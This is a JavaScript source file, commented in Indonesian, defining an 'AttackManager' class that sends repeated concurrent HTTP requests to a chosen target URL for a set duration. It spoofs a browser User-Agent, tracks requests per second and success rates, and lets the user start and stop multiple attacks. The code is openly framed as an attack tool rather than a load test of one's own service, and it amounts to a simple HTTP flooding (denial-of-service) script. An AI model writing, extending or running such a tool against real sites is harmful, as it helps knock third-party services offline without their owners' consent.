import axios from 'axios';
import chalk from 'chalk';

class AttackManager {
    constructor() {
        this.attacks = new Map();
        this.requestCount = 0;
        this.requestHistory = [];
        this.maxHistory = 100;
    }

    // Validasi URL
    validateUrl(url) {
        try {
            const parsedUrl = new URL(url);
            return parsedUrl.protocol === 'http:' || parsedUrl.protocol === 'https:';
        } catch {
            return false;
        }
    }

    // Method untuk melakukan HTTP request
    async makeRequest(url, method = 'GET', timeout = 10000) {
        if (!this.validateUrl(url)) {
            return { success: false, error: 'URL tidak valid' };
        }

        try {
            const startTime = Date.now();
            const response = await axios({
                method: method.toLowerCase(),
                url: url,
                timeout: timeout,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive'
                },
                validateStatus: () => true
            });
            
            const endTime = Date.now();
            const responseTime = endTime - startTime;

            this.requestCount++;
            
            // Simpan ke history
            this.requestHistory.push({
                url: url,
                method: method,
                status: response.status,
                responseTime: responseTime,
                timestamp: new Date().toISOString()
            });

            // Batasi history
            if (this.requestHistory.length > this.maxHistory) {
                this.requestHistory.shift();
            }

            return {
                success: true,
                status: response.status,
                responseTime: responseTime,
                headers: response.headers,
                data: response.data
            };
        } catch (error) {
            this.requestCount++;
            
            this.requestHistory.push({
                url: url,
                method: method,
                status: 0,
                responseTime: 0,
                error: error.message,
                timestamp: new Date().toISOString()
            });

            return {
                success: false,
                error: error.message,
                status: error.response?.status || 0
            };
        }
    }

    // Method untuk memulai attack
    async startAttack(targetUrl, durationMs, concurrency = 3, method = 'GET') {
        if (!this.validateUrl(targetUrl)) {
            throw new Error('URL tidak valid. Gunakan http:// atau https://');
        }

        const attackId = Date.now().toString();
        let attackCount = 0;

        console.log(chalk.yellow(`🚀 Memulai attack ke: ${targetUrl}`));
        console.log(chalk.yellow(`⏰ Durasi: ${durationMs / 1000} detik`));
        console.log(chalk.yellow(`🔢 Concurrency: ${concurrency}`));
        console.log(chalk.yellow(`📨 Method: ${method}`));

        const attackInfo = {
            target: targetUrl,
            method: method,
            startTime: Date.now(),
            endTime: Date.now() + durationMs,
            requests: 0,
            successful: 0,
            failed: 0,
            active: true,
            concurrency: concurrency
        };

        this.attacks.set(attackId, attackInfo);

        // Fungsi untuk melakukan requests
        const makeRequests = async () => {
            while (attackInfo.active && Date.now() < attackInfo.endTime) {
                try {
                    const result = await this.makeRequest(targetUrl, method);
                    attackInfo.requests++;
                    
                    if (result.success) {
                        attackInfo.successful++;
                    } else {
                        attackInfo.failed++;
                    }
                    
                    attackCount++;
                    
                    // Log setiap 20 requests
                    if (attackCount % 20 === 0) {
                        const elapsed = (Date.now() - attackInfo.startTime) / 1000;
                        const rps = (attackCount / elapsed).toFixed(2);
                        console.log(chalk.blue(`📊 Attack ${attackId}: ${attackCount} requests | ${rps} RPS`));
                    }
                    
                    // Tunggu sebentar antara requests
                    await new Promise(resolve => setTimeout(resolve, 50));
                } catch (error) {
                    attackInfo.failed++;
                }
            }
        };

        // Jalankan multiple concurrent requests
        const promises = [];
        for (let i = 0; i < concurrency; i++) {
            promises.push(makeRequests());
        }

        // Jalankan attack dan return hasil
        try {
            await Promise.all(promises);
            attackInfo.active = false;
            const totalTime = (Date.now() - attackInfo.startTime) / 1000;

            const result = {
                attackId: attackId,
                target: targetUrl,
                totalRequests: attackInfo.requests,
                successful: attackInfo.successful,
                failed: attackInfo.failed,
                duration: totalTime,
                rps: (attackInfo.requests / totalTime).toFixed(2),
                successRate: ((attackInfo.successful / attackInfo.requests) * 100).toFixed(2)
            };

            console.log(chalk.green(`✅ Attack ${attackId} selesai!`));
            console.log(chalk.green(`📊 Total Requests: ${result.totalRequests}`));
            console.log(chalk.green(`✅ Berhasil: ${result.successful}`));
            console.log(chalk.green(`❌ Gagal: ${result.failed}`));
            console.log(chalk.green(`🎯 Success Rate: ${result.successRate}%`));
            console.log(chalk.green(`⏱️  Waktu: ${result.duration.toFixed(2)} detik`));
            console.log(chalk.green(`📈 RPS: ${result.rps} requests/detik`));

            this.attacks.delete(attackId);
            return result;
        } catch (error) {
            attackInfo.active = false;
            throw error;
        }
    }

    // Method untuk mendapatkan status attack
    getAttackStatus(attackId) {
        return this.attacks.get(attackId);
    }

    // Method untuk mendapatkan semua active attacks
    getActiveAttacks() {
        return Array.from(this.attacks.entries());
    }

    // Method untuk menghentikan attack tertentu
    stopAttack(attackId) {
        const attack = this.attacks.get(attackId);
        if (attack) {
            attack.active = false;
            this.attacks.delete(attackId);
            console.log(chalk.red(`🛑 Attack ${attackId} dihentikan!`));
            return true;
        }
        return false;
    }

    // Method untuk menghentikan semua attack
    stopAllAttacks() {
        const stopped = this.attacks.size;
        for (const [id, attack] of this.attacks) {
            attack.active = false;
        }
        this.attacks.clear();
        console.log(chalk.red(`🛑 ${stopped} attack dihentikan!`));
        return stopped;
    }

    // Method untuk mendapatkan total requests
    getTotalRequests() {
        return this.requestCount;
    }

    // Method untuk mendapatkan request history
    getRequestHistory(limit = 10) {
        return this.requestHistory.slice(-limit).reverse();
    }

    // Method untuk mendapatkan statistics
    getStatistics() {
        const total = this.requestCount;
        const active = this.attacks.size;
        const history = this.requestHistory;

        const successCount = history.filter(r => r.status >= 200 && r.status < 300).length;
        const errorCount = history.filter(r => r.status >= 400).length;
        const timeoutCount = history.filter(r => r.status === 0).length;

        return {
            totalRequests: total,
            activeAttacks: active,
            successRate: total > 0 ? ((successCount / total) * 100).toFixed(2) : '0.00',
            errorRate: total > 0 ? ((errorCount / total) * 100).toFixed(2) : '0.00',
            timeoutRate: total > 0 ? ((timeoutCount / total) * 100).toFixed(2) : '0.00'
        };
    }
}

export default AttackManager;